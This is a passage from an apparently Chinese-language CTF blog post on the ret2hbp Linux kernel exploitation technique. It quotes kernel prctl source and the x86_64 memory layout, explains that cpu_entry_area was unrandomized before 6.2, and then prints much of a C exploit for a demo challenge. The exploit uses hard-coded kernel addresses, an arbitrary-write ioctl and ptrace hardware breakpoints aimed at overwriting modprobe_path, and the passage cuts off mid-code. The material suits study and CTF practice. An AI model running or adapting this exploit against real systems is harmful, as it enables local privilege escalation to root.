-EFAULT;<br><br>error = validate_prctl_map_addr(&amp;prctl_map);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Someone is trying to cheat the auxv vector.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!prctl_map.auxv ||<br>prctl_map.auxv_size &gt; <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-built_in">memset</span>(user_auxv, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><span class="hljs-keyword">if</span> (copy_from_user(user_auxv,<br>   (<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *)prctl_map.auxv,<br>   prctl_map.auxv_size))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-comment">/* Last entry must be AT_NULL as specification requires */</span><br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">2</span>] = AT_NULL;<br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">1</span>] = AT_NULL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (prctl_map.exe_fd != (u32)<span class="hljs-number">-1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if the current user is checkpoint/restore capable.</span><br><span class="hljs-comment"> * At the time of this writing, it checks for CAP_SYS_ADMIN</span><br><span class="hljs-comment"> * or CAP_CHECKPOINT_RESTORE.</span><br><span class="hljs-comment"> * Note that a user with access to ptrace can masquerade an</span><br><span class="hljs-comment"> * arbitrary program as any executable, even setuid ones.</span><br><span class="hljs-comment"> * This may have implications in the tomoyo subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!checkpoint_restore_ns_capable(current_user_ns()))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>error = prctl_set_mm_exe_file(mm, prctl_map.exe_fd);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * arg_lock protects concurent updates but we still need mmap_lock for</span><br><span class="hljs-comment"> * read to exclude races with sys_brk.</span><br><span class="hljs-comment"> */</span><br>mmap_read_lock(mm);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We don&#x27;t validate if these members are pointing to</span><br><span class="hljs-comment"> * real present VMAs because application may have correspond</span><br><span class="hljs-comment"> * VMAs already unmapped and kernel uses these members for statistics</span><br><span class="hljs-comment"> * output in procfs mostly, except</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  - @start_brk/@brk which are used in do_brk_flags but kernel lookups</span><br><span class="hljs-comment"> *    for VMAs when updating these memvers so anything wrong written</span><br><span class="hljs-comment"> *    here cause kernel to swear at userspace program but won&#x27;t lead</span><br><span class="hljs-comment"> *    to any problem in kernel itself</span><br><span class="hljs-comment"> */</span><br><br>spin_lock(&amp;mm-&gt;arg_lock);<br>mm-&gt;start_code= prctl_map.start_code;<br>mm-&gt;end_code= prctl_map.end_code;<br>mm-&gt;start_data= prctl_map.start_data;<br>mm-&gt;end_data= prctl_map.end_data;<br>mm-&gt;start_brk= prctl_map.start_brk;<br>mm-&gt;brk= prctl_map.brk;<br>mm-&gt;start_stack= prctl_map.start_stack;<br>mm-&gt;arg_start= prctl_map.arg_start;<br>mm-&gt;arg_end= prctl_map.arg_end;<br>mm-&gt;env_start= prctl_map.env_start;<br>mm-&gt;env_end= prctl_map.env_end;<br>spin_unlock(&amp;mm-&gt;arg_lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note this update of @saved_auxv is lockless thus</span><br><span class="hljs-comment"> * if someone reads this member in procfs while we&#x27;re</span><br><span class="hljs-comment"> * updating -- it may get partly updated results. It&#x27;s</span><br><span class="hljs-comment"> * known and acceptable trade off: we leave it as is to</span><br><span class="hljs-comment"> * not introduce additional locks here making the kernel</span><br><span class="hljs-comment"> * more complex.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size)<br><span class="hljs-built_in">memcpy</span>(mm-&gt;saved_auxv, user_auxv, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><br>mmap_read_unlock(mm);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HOWEVER"><a href="#HOWEVER" class="headerlink" title="HOWEVER"></a>HOWEVER</h2><p><code>ret2hbp</code>之所以能够利用，是由于<code>cpu_entry_area</code>这块2T的内存并没有被随机化</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br></code></pre></td></tr></table></figure><p>but在6.2及后续版本中，这块区域也被加上了一个偏移，通过<code>get_cpu_entry_area</code>可以很清楚的看到这一点</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123711.png" style="zoom:50%;" /><h1 id="0x02：好多好多的例题"><a href="#0x02：好多好多的例题" class="headerlink" title="0x02：好多好多的例题"></a>0x02：好多好多的例题</h1><h2 id="demo例题"><a href="#demo例题" class="headerlink" title="demo例题"></a>demo例题</h2><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202155116.png" style="zoom:50%;" /><p>十分白给的无限次数任意地址写8字节</p><p>直接按照上面分析的思路写即可，泄露kaslr之后用modprobe完成利用</p><h3 id="FINAL-EXP-modprobe解法"><a href="#FINAL-EXP-modprobe解法" class="headerlink" title="FINAL EXP   modprobe解法"></a>FINAL EXP   modprobe解法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span 